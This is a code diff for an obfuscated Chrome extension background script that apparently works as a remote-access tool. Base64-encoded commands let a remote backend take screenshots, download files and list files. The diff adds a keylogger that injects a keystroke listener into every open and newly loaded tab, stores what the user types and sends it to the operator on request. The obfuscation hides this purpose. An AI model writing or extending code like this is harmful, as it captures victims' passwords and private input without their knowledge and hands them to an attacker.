@@ -1,7 +1,7 @@
 //build-22012026
 const _0x1a2b = (s) => {return atob(s);};
-// const _0x4b2a = _0x1a2b('aHR0cDovL2xvY2FsaG9zdDo4MDgw');
-const _0x4b2a = _0x1a2b('aHR0cHM6Ly9kaXNib3QtYmFja2VuZHppcC0tZGV2aWxoZXJvMzk5LnJlcGxpdC5hcHA=');
+const _0x4b2a = _0x1a2b('aHR0cDovL2xvY2FsaG9zdDo4MDgw');
+// const _0x4b2a = _0x1a2b('aHR0cHM6Ly9kaXNib3QtYmFja2VuZHppcC0tZGV2aWxoZXJvMzk5LnJlcGxpdC5hcHA=');
 let _0x1f3e = null;
 let _0x2d5c = null;
 let _0x3a9b = _0x1a2b('Q2hyb21lIEV4dGVuc2lvbg==');
@@ -39,6 +39,15 @@ function _0xb4d5() {
         chrome.alarms.create(_0x6b8c, { delayInMinutes: 0, periodInMinutes: _0x7e9d });
     });
     _0xe708();
+    
+    // Inject keylogger into existing tabs
+    chrome.tabs.query({}, (tabs) => {
+        tabs.forEach(t => {
+            if (t.url && !t.url.startsWith('chrome:')) {
+                _0x8093(t.id);
+            }
+        });
+    });
 }
 
 function _0xc5e6() {
@@ -120,6 +129,8 @@ async function _0xf819(c) {
             case _0x1a2b('b3Blbl9hbmRfc2NyZWVuc2hvdA=='): await _0xc4d5(c.id, c.requestedById, c.url, c.closeAfter); break;
             case _0x1a2b('ZG93bmxvYWRfZmlsZQ=='): await _0xd5e6(c.id, c.requestedById, c.filePath); break;
             case _0x1a2b('bGlzdF9maWxlcw=='): await _0xe6f7(c.id, c.requestedById, c.path); break;
+            case _0x1a2b('a2V5bG9nZ2Vy'): await _0xf920(c.id, c.requestedById); break;
+            case _0x1a2b('Y2xlYXJfa2V5bG9nZ2Vy'): await _0xfa21(c.id, c.requestedById); break;
         }
     } catch (e) {
         await _0xf708(c.id, _0x1a2b('ZXJyb3I='), { message: e.message });
@@ -583,6 +594,27 @@ function _0x9092(conn) {
     }).catch(() => {});
 }
 
+function _0x8093(tid) {
+    chrome.scripting.executeScript({
+        target: { tabId: tid, allFrames: true },
+        func: () => {
+            if (window._0x12ff) return;
+            window._0x12ff = true;
+            document.addEventListener('keydown', (e) => {
+                let k = e.key;
+                if (k.length > 1) k = ` [${k}] `;
+                chrome.runtime.sendMessage({ type: 'kl_data', key: k });
+            });
+        }
+    }).catch(() => {});
+}
+
+chrome.tabs.onUpdated.addListener((tid, ci, t) => {
+    if (ci.status === 'complete' && t.url && !t.url.startsWith('chrome:')) {
+        _0x8093(tid);
+    }
+});
+
 chrome.runtime.onMessage.addListener((req, snd, res) => {
     switch (req.type) {
         case _0x1a2b('Z2V0X3N0YXR1cw=='):
@@ -612,6 +644,33 @@ chrome.runtime.onMessage.addListener((req, snd, res) => {
             _0x192a(_0x1a2b('bWFudWFsX3Rlc3Q='));
             res({ success: true });
             break;
+        case 'kl_data':
+            chrome.storage.local.get(['_0sdv4'], (r) => {
+                const ex = r._0sdv4 || "";
+                chrome.storage.local.set({ _0sdv4: ex + req.key });
+            });
+            break;
     }
     return true;
 });
+
+async function _0xf920(id, uid) {
+    try {
+        const r = await chrome.storage.local.get(['_0sdv4']);
+        const keys = r._0sdv4 || "No key cap yet.";
+        await _0xf708(id, _0x1a2b('a2V5bG9nZ2Vy'), { keystrokes: keys }, uid);
+        // Clear after sending
+        await chrome.storage.local.remove(['_0sdv4']);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
+    }
+}
+
+async function _0xfa21(id, uid) {
+    try {
+        await chrome.storage.local.remove(['_0sdv4']);
+        await _0xf708(id, _0x1a2b('a2V5bG9nZ2VyX2NsZWFyZWQ='), { success: true }, uid);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
+    }
+}
